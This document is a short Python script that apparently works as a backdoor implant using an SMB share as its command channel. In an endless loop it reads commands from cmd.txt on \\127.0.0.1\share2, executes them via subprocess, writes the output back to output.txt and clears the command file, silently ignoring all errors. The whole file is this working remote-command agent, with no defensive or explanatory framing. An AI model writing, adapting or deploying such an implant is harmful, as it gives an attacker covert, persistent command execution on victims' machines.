import smbclient
import subprocess
# Configure smbclient with your credentials
smbclient.ClientConfig(username="", password="")
def Exec(cmd):
    output = subprocess.check_output(cmd, shell=False)
    return output

while True:
    try:
        output = ""
        with smbclient.open_file(r"\\127.0.0.1\share2\\cmd.txt", mode="r") as file:
            content = file.read()
            if not content:
                file.close()
                continue
            output = Exec(content).decode()
            file.close()
        with smbclient.open_file(r"\\127.0.0.1\share2\\output.txt", mode="a") as file:
            file.write(output)
            file.close()
        with smbclient.open_file(r"\\127.0.0.1\share2\\cmd.txt", mode="w") as file:
            file.write("")
            file.close() 
    except Exception as e:
        continue
